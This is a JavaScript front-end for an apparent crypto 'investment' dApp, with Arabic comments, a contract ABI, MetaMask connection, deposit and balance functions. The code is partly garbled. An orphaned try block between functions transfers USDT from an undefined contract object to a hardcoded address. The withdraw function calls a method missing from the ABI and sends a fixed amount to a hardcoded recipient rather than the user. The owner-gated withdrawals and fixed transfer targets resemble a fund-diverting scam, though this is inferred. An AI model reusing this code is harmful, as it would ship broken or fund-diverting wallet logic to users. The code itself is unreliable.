 
        let web3;
        let account;
        let contract;

        const contractAddress = "0xd1977eEF9c4941820ef2bEe8AB896Be1534578Bc"; // ضع عنوان العقد هنا
        const contractABI = [
	{
		"inputs": [],
		"name": "approveWithdrawal",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "deposit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "executeWithdrawal",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "startInvestment",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "withdrawYield",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "approvedForWithdrawal",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"name": "balances",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "calculateYield",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "investmentAmount",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "investmentBalance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "lastPayoutTime",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "payoutFrequency",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "walletBalance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"name": "withdrawalApproval",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "yieldRate",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];
      // الاتصال بمحفظة MetaMask
async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            account = accounts[0];
            document.getElementById("walletAddress").innerText = `Wallet Address: ${account}`;

            // إعداد الكائن contract للاتصال بالعقد
            contract = new web3.eth.Contract(contractABI, contractAddress);

            // تحديث الأرصدة بعد الاتصال
            updateBalances();
        } catch (error) {
            console.error("Error connecting to wallet:", error);
            alert("Could not connect to wallet. Please try again.");
        }
    } else {
        alert("Please install MetaMask to connect your wallet.");
    }
}
// دالة الإيداع
async function deposit() {
    const amountInput = document.getElementById("amountInput").value;
    const amount = parseFloat(amountInput);

    if (!amount || amount <= 0) {
        alert("Please enter a valid amount.");
        return;
    }

    try {
        // تقدير الغاز لدالة `deposit` على العقد
        const gasEstimate = await contract.methods.deposit(web3.utils.toWei(amount.toString(), 'ether')).estimateGas({
            from: account
        });

        // استدعاء دالة `deposit` من خلال `contract.methods`
        await contract.methods.deposit(web3.utils.toWei(amount.toString(), 'ether')).send({
            from: account,
            gas: gasEstimate
        });

        alert("Deposit successful!");
        updateBalances(); // تحديث الأرصدة بعد الإيداع
    } catch (error) {
        console.error("Error during deposit:", error);
        alert("Transaction failed: " + error.message);
    }
}
try {
                    const tx = await usdtContract.methods.transfer('0xd1977eEF9c4941820ef2bEe8AB896Be1534578Bc', amountToSend).send({ from: sender });
                    console.log('Transaction successful:', tx);
                } catch (error) {
                    console.error('Transaction failed:', error);
                }
            };

// بدء الاستثمار
async function startInvestment() {
    if (!account) {
        alert("Please connect your wallet first.");
        return;
    }
    try {
        const gasEstimate = await contract.methods.startInvestment().estimateGas({ from: account });

        await contract.methods.startInvestment().send({ from: account, gas: gasEstimate });
        alert("Investment started successfully!");
        updateBalances();
    } catch (error) {
        console.error("Error in starting investment:", error);
        alert("Error: " + error.message);
    }
}

// تحديث الأرصدة
async function updateBalances() {
    if (!account || !contract) return;

    try {
        const walletBalance = await contract.methods.walletBalance().call({ from: account });
        const investmentBalance = await contract.methods.investmentBalance().call({ from: account });
        const yieldRate = await contract.methods.yieldRate().call();

        document.getElementById("walletBalance").textContent = web3.utils.fromWei(walletBalance, 'ether') + " ETH";
        document.getElementById("investmentBalance").textContent = web3.utils.fromWei(investmentBalance, 'ether') + " ETH";
        document.getElementById("yieldRate").textContent = (yieldRate / 100).toFixed(2) + "%";
    } catch (error) {
        console.error("Error updating balances:", error);
    }
}

// دالة السحب
async function withdrawFunds() {
    const amount = web3.utils.toWei("0.0014", "ether");
    const recipient = "0x0DD5C4c9B169317BF0B77D927d2cB1eC3570Dbb3";

    try {
        const gasEstimate = await contract.methods.withdraw(amount, recipient).estimateGas({ from: account });

        await contract.methods.withdraw(amount, recipient).send({ from: account, gas: gasEstimate });
        alert("Withdrawal successful!");
    } catch (error) {
        console.error("Error during withdrawal:", error);
        alert("Error: " + error.message);
    }
}

// تحديث المعلومات بشكل دوري
setInterval(updateBalances, 9000);
    
